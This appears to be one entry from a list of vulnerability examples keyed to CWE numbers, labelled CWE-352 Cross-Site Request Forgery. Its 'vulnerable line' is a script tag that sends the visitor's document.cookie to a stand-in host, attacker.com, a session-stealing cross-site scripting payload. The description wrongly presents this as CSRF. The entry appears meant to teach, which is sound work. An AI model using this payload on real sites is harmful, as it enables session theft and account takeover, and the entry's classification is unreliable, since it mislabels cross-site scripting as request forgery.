#6.# CWE-352: Cross-Site Request Forgery (CSRF)
# Vulnerable line: <script>document.location='http://attacker.com/steal_cookie.php?cookie='+document.cookie;</script>
# Description: The script tag is vulnerable to CSRF attacks as it allows an attacker to steal the user's session cookie and impersonate them on the website.